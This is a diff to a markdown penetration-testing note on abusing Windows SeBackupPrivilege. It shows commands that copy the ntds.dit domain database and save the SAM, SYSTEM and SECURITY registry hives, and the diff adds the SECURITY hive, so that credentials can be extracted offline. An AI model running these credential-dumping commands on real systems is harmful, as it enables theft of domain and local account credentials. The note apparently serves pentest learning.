@@ -200,12 +200,12 @@ Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 robocopy /B E:\Windows\NTDS .\Tools ntds.dit
 ```
 
-### Backing up SAM and SYSTEM Registry Hives
+### Backing up SAM , Security and SYSTEM Registry Hives
 - The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline
 ```powershell
-reg save HKLM\SYSTEM SYSTEM.SAV
-
-reg save HKLM\SAM SAM.SAV
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
 ```
 
 ### Extracting Credentials
